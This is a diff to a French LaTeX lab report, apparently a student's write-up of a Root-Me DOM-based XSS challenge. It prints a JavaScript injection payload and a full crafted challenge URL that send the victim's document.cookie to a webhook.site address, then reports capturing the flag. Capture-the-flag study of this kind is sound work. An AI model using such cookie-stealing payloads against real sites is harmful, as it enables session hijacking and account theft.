@@ -176,9 +176,38 @@ J'ai dans un premier temps testé l'injection de code JavaScript très simple da
     \caption{Premier test}
 \end{figure}
 
-Maintenant que
+Maintenant que cette simple requête fonctionne, j'ai décidé d'aller un peu plus loin, en essayant d'envoyer une requête depuis le champs du formulaire de la page "Main" vers le site webhook pour voir ce que j'obtiens avec cette requête. \\
 
-Ensuite, webhook 
+\textit{NB: À partir de là, j'ai commencer à fouiller différentes ressources pour déterminer l'url de mes requêtes: le forum du challenge sur root-me, dont \href{https://www.root-me.org/fr/Documentation/Web/DOM-Based-XSS?lang=fr}{cette ressource}, ainsi que différents blogs sur le net }\\
+
+
+\url{ d'; document.location="https://webhook.site/ec7d4396-2f5f-436d-bdc7-1db1e8c78cd5?cmd=".concat(document.cookie);//}
+
+\begin{figure}[!h]
+	\centering
+	\includegraphics[scale=.3]{xss_webhook_1.png}
+	\caption{webhook 1}
+\end{figure}
+
+
+J'ai donc essayé de faire la même chose avec la requête depuis le formulaire de contact, cette fois-ci en tenant compte du format imposé dans le champs du formulaire, avec l'url suivante : \url{http://challenge01.root-me.org/web-client/ch32/index.php?number=test\%27;\\\%20document.location=\%22https://webhook.site/ec7d4396-2f5f-436d-bdc7-1db1e8c78cd5?cmd=\%22.concat(document.cookie);//}
+
+
+
+\begin{figure}[!h]
+	\centering
+	\includegraphics[scale=.3]{xss_webhook_2.png}
+	\caption{webhook 2}
+\end{figure}
+
+En bas de la page, on obtiens le flag
+
+\begin{figure}[!h]
+	\centering
+	\includegraphics[scale=.45]{xss_reussi_rootme.png}
+	\caption{Challenge réussi}
+\end{figure}
+
 	\subsection{Les recommandations ANSSI contre les vulnerabilités XSS}
 	
 	\textit{Expliquez les recommandations ANSSI contre les vulnerabilités XSS.}
